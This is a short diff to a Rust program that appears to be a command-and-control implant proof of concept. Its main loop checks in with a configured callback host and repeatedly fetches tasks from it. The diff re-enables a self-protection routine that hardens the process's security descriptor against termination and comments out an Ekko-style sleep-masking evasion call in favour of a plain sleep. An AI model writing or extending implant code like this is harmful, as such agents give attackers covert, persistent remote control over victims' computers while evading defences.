@@ -27,7 +27,7 @@ use winapi::{
 }};
 
 fn main() {
-    /*let pid = unsafe { 
+    let pid = unsafe { 
         GetCurrentProcessId() 
     };
 
@@ -35,7 +35,7 @@ fn main() {
 
     selfprotect::set_process_security_descriptor();
 
-    println!("[*] Process Protected. Press Enter to Exit PoC");*/
+    println!("[*] Process Protected. Press Enter to Exit PoC");
 
     println!("URL: {}", config::callback_host);
     checkin::checkin();
@@ -44,6 +44,7 @@ fn main() {
         if let Err(e) = tasking::getTasking() {
             eprintln!("Tasking error: {}", e);
         }
-        ekko::smart_ekko((config::callback_interval * 1000) as u32)
+        //ekko::smart_ekko((config::callback_interval * 1000) as u32)
+        thread::sleep(Duration::from_millis(config::callback_interval * 1000));
     }
 }
